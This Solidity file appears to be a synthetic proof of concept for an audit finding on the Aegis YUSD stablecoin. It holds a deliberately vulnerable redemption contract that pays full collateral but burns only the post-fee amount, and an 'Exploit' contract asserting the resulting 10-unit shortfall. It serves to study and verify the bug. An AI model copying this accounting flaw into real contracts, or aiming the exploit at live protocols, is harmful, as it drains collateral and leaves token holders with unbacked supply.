// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Aegis YUSD — redemption pays full collateral and burns only the post-fee amount
    (Sherlock H-1, April 2025).
    SYNTHETIC, cheatcode-free. One redemption, no time warp.
    The fee rate is the stored 1000 bps (10 percent). Collateral out is the
    full 100. Only 90 YUSD is burned. The 10 YUSD fee is unbacked and the
    pool is short 10. Fair collateral for the burned amount is 90. */

contract Token {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
    }
}

contract Insurance {}

contract AegisMinting {
    Token public yusd;
    Token public collateral;
    address public insuranceFund;
    uint256 public redeemFeeBP;
    uint256 public collateralRate;
    uint256 public paidCollateral;
    uint256 public quoted;
    uint256 public shortfall;

    constructor(Token yusd_, Token collateral_, address insurance_, uint256 feeBP) {
        yusd = yusd_;
        collateral = collateral_;
        insuranceFund = insurance_;
        redeemFeeBP = feeBP;
        collateralRate = 10000;
    }

    function quoteCollateral(uint256 amount) external returns (uint256) {
        // @> VULN: the 1:1 rate is applied to the full yusd amount, not to the amount that will be burned.
        quoted = amount * collateralRate / 10000;
        return quoted;
    }

    function _calculateInsuranceFundFeeFromAmount(uint256 amount, uint256 feeBP)
        public
        pure
        returns (uint256 burnAmount, uint256 fee)
    {
        fee = amount * feeBP / 10000;
        burnAmount = amount - fee;
    }

    function _calculateRedeemMinCollateralAmount(uint256 yusdAmount) public pure returns (uint256) {
        return yusdAmount;
    }

    function approveRedeemRequest(address userWallet, uint256 amount)
        external
        virtual
        returns (uint256 collateralAmount, uint256 burnAmount, uint256 fee)
    {
        collateralAmount = this.quoteCollateral(amount);
        paidCollateral = collateralAmount;
        (burnAmount, fee) = _calculateInsuranceFundFeeFromAmount(amount, redeemFeeBP);
        if (fee > 0) {
            yusd.transfer(insuranceFund, fee);
        }
        collateral.transfer(userWallet, collateralAmount);
        yusd.burn(burnAmount);
        shortfall = paidCollateral - burnAmount;
    }
}

contract Exploit {
    Token public collateral; // nonce 1
    Token public yusd; // nonce 2
    Insurance public insurance; // nonce 3
    AegisMinting public minting; // nonce 4

    constructor() {
        collateral = new Token();
        yusd = new Token();
        insurance = new Insurance();
        minting = new AegisMinting(yusd, collateral, address(insurance), 1000);
        collateral.mint(address(minting), 100);
        yusd.mint(address(minting), 100);
    }

    function run() external {
        (uint256 received, uint256 burned, uint256 fee) = minting.approveRedeemRequest(address(this), 100);
        uint256 fair = burned;
        require(received == 100, "received 100");
        require(fair == 90, "fair 90");
        require(fee == 10, "fee 10");
        require(minting.shortfall() == 10, "pool short 10");
        require(collateral.balanceOf(address(this)) == 100, "redeemer got 100");
        require(collateral.balanceOf(address(minting)) == 0, "pool collateral is 0");
        require(yusd.balanceOf(address(insurance)) == 10, "10 fee yusd still outstanding");
        require(yusd.totalSupply() == 10, "unbacked supply is 10");
    }
}
